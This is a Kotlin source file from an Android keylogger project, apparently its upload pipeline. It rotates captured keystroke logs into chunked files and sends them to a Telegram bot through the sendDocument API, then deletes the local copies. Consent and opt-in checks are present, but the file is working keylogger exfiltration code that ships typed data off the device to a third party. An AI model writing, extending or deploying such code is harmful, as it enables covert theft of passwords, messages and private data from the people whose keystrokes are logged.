package com.bshu2.androidkeylogger

import android.content.Context
import android.util.Log
import java.io.BufferedReader
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Rotate/upload/prune pipeline. Every method is blocking; call from a worker.
 * Upload is opt-in: when no destination is configured the files stay local.
 */
object UploadPipeline {
    const val TAG = "Keylogger"
    const val PENDING_FILE = "pending.txt"
    const val OUTBOX_DIR = "outbox"

    private const val TELEGRAM_API = "https://api.telegram.org/bot"
    private const val MAX_CHUNK_BYTES = 8L * 1024L * 1024L
    private const val MAX_UPLOAD_BYTES = 45L * 1024L * 1024L
    private const val ARCHIVE_KEEP_DAYS = 2

    private val DAILY_ARCHIVE = Regex("keylog_\\d{8}\\.txt")

    fun logDir(ctx: Context): File {
        val dir = ctx.getExternalFilesDir(null) ?: ctx.filesDir
        if (dir != null && !dir.exists()) dir.mkdirs()
        return dir ?: ctx.cacheDir
    }

    @Synchronized
    fun run(ctx: Context) {
        if (!Prefs.hasConsent(ctx)) {
            Log.d(TAG, "no consent; pipeline skipped")
            return
        }
        val config = TelegramConfig.load(ctx)
        val upload = Prefs.uploadEnabled(ctx) && config.isConfigured
        if (!upload) Log.d(TAG, "upload disabled or unconfigured; local only")
        rotatePending(ctx)
        if (upload) uploadOutbox(ctx, config)
        pruneArchives(ctx)
        Prefs.markRun(ctx)
    }

    fun append(file: File, line: String) {
        try {
            FileOutputStream(file, true).use {
                it.write(line.toByteArray(StandardCharsets.UTF_8))
            }
        } catch (e: Exception) {
            Log.e(TAG, "local write failed", e)
        }
    }

    fun rotatePending(ctx: Context) {
        val pending = File(logDir(ctx), PENDING_FILE)
        if (!pending.exists() || pending.length() == 0L) return
        val outbox = File(logDir(ctx), OUTBOX_DIR)
        if (!outbox.exists() && !outbox.mkdirs()) {
            Log.e(TAG, "cannot create outbox dir")
            return
        }
        if (pending.length() > MAX_CHUNK_BYTES) {
            splitPending(pending, outbox)
            return
        }
        val base = "keylog_" + fileStamp().format(Date())
        val snapshot = uniqueFile(outbox, base)
        if (!pending.renameTo(snapshot) && !copyAndTruncate(pending, snapshot)) {
            Log.e(TAG, "rotate failed")
        }
    }

    /** Removes every log, pending queue and outbox entry. */
    fun deleteAll(ctx: Context) {
        val dir = logDir(ctx)
        dir.listFiles()?.forEach { f ->
            if (f.isDirectory) f.deleteRecursively() else f.delete()
        }
        Prefs.resetLastRun(ctx)
        Log.d(TAG, "all logs deleted by user")
    }

    private fun fileStamp() = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)

    private fun uniqueFile(dir: File, base: String): File {
        var f = File(dir, "$base.txt")
        var n = 1
        while (f.exists()) {
            f = File(dir, "${base}_$n.txt")
            n++
        }
        return f
    }

    private fun splitPending(pending: File, outbox: File) {
        val base = fileStamp().format(Date())
        var part = 0
        val buf = ByteArrayOutputStream()
        val written = mutableListOf<File>()
        try {
            BufferedReader(InputStreamReader(FileInputStream(pending), StandardCharsets.UTF_8)).use { reader ->
                var line: String?
                while (true) {
                    line = reader.readLine() ?: break
                    val bytes = (line + "\n").toByteArray(StandardCharsets.UTF_8)
                    if (buf.size() > 0 && buf.size() + bytes.size > MAX_CHUNK_BYTES) {
                        written.add(writeChunk(outbox, base, part++, buf.toByteArray()))
                        buf.reset()
                    }
                    buf.write(bytes, 0, bytes.size)
                }
            }
            if (buf.size() > 0) written.add(writeChunk(outbox, base, part, buf.toByteArray()))
        } catch (e: Exception) {
            Log.e(TAG, "split failed", e)
            written.forEach { if (!it.delete()) Log.w(TAG, "could not remove partial chunk ${it.name}") }
            return
        }
        try {
            FileOutputStream(pending, false).close()
        } catch (e: Exception) {
            Log.e(TAG, "truncate failed", e)
        }
    }

    private fun writeChunk(outbox: File, base: String, part: Int, data: ByteArray): File {
        val target = uniqueFile(outbox, String.format(Locale.US, "keylog_%s_%03d", base, part))
        FileOutputStream(target).use {
            it.write(data)
            it.flush()
        }
        return target
    }

    private fun copyAndTruncate(src: File, dst: File): Boolean {
        var ok = false
        try {
            FileInputStream(src).use { input ->
                FileOutputStream(dst).use { output ->
                    val buf = ByteArray(8192)
                    var n: Int
                    while (input.read(buf).also { n = it } > 0) output.write(buf, 0, n)
                    output.flush()
                }
            }
            FileOutputStream(src, false).close()
            ok = true
            return true
        } catch (e: Exception) {
            Log.e(TAG, "rotate failed", e)
            return false
        } finally {
            if (!ok && dst.exists() && !dst.delete()) {
                Log.w(TAG, "could not remove partial snapshot ${dst.name}")
            }
        }
    }

    private fun pruneArchives(ctx: Context) {
        val files = logDir(ctx).listFiles() ?: return
        val cutoff = System.currentTimeMillis() - ARCHIVE_KEEP_DAYS * 24L * 60L * 60L * 1000L
        files.forEach { f ->
            if (!f.isFile || !DAILY_ARCHIVE.matches(f.name)) return@forEach
            if (f.lastModified() >= cutoff) return@forEach
            if (f.delete()) Log.d(TAG, "pruned ${f.name}")
        }
    }

    private fun uploadOutbox(ctx: Context, config: TelegramConfig.Config) {
        val outbox = File(logDir(ctx), OUTBOX_DIR)
        val files = outbox.listFiles() ?: return
        if (files.isEmpty()) return
        files.sort()
        for (f in files) {
            if (!f.isFile || f.length() == 0L) {
                if (!f.delete()) Log.w(TAG, "could not delete empty ${f.name}")
                continue
            }
            if (f.name.endsWith(".failed")) continue
            if (f.length() > MAX_UPLOAD_BYTES) {
                val parked = File(f.parentFile, f.name + ".failed")
                if (f.renameTo(parked)) Log.e(TAG, "oversized, parked as ${parked.name}")
                continue
            }
            val caption = "${config.deviceName} log ${f.name}"
            if (sendDocument(f, caption, config)) {
                if (!f.delete()) Log.w(TAG, "could not delete uploaded ${f.name}")
                Log.d(TAG, "uploaded ${f.name}")
            } else {
                Log.e(TAG, "upload failed, will retry next cycle: ${f.name}")
                break
            }
        }
    }

    private fun sendDocument(file: File, caption: String, config: TelegramConfig.Config): Boolean {
        val boundary = "----Keylogger" + System.currentTimeMillis()
        var conn: HttpURLConnection? = null
        try {
            val head = multipartHead(boundary, caption, file.name, config.chatId)
            val tail = ("\r\n--$boundary--\r\n").toByteArray(StandardCharsets.UTF_8)
            val total = head.size + file.length() + tail.size
            val url = URL(TELEGRAM_API + config.botToken + "/sendDocument")
            conn = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                doOutput = true
                connectTimeout = 15000
                readTimeout = 120000
                setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                setFixedLengthStreamingMode(total)
            }
            conn.outputStream.use { os ->
                os.write(head)
                FileInputStream(file).use { input ->
                    val buf = ByteArray(16384)
                    var n: Int
                    while (input.read(buf).also { n = it } > 0) os.write(buf, 0, n)
                }
                os.write(tail)
                os.flush()
            }
            val code = conn.responseCode
            if (code < 200 || code >= 300) {
                Log.e(TAG, "sendDocument http=$code")
                return false
            }
            Log.d(TAG, "sendDocument ok http=$code file=${file.name} bytes=${file.length()}")
            return true
        } catch (e: Exception) {
            Log.e(TAG, "sendDocument failed", e)
            return false
        } finally {
            conn?.disconnect()
        }
    }

    private fun multipartHead(boundary: String, caption: String, filename: String, chatId: String): ByteArray {
        val head = ByteArrayOutputStream()
        writeField(head, boundary, "chat_id", chatId)
        writeField(head, boundary, "caption", caption)
        head.write(("--$boundary\r\n").toByteArray(StandardCharsets.UTF_8))
        head.write(("Content-Disposition: form-data; name=\"document\"; filename=\"$filename\"\r\n").toByteArray(StandardCharsets.UTF_8))
        head.write("Content-Type: text/plain\r\n\r\n".toByteArray(StandardCharsets.UTF_8))
        return head.toByteArray()
    }

    private fun writeField(os: OutputStream, boundary: String, name: String, value: String) {
        os.write(("--$boundary\r\n").toByteArray(StandardCharsets.UTF_8))
        os.write(("Content-Disposition: form-data; name=\"$name\"\r\n\r\n").toByteArray(StandardCharsets.UTF_8))
        os.write(value.toByteArray(StandardCharsets.UTF_8))
        os.write("\r\n".toByteArray(StandardCharsets.UTF_8))
    }
}
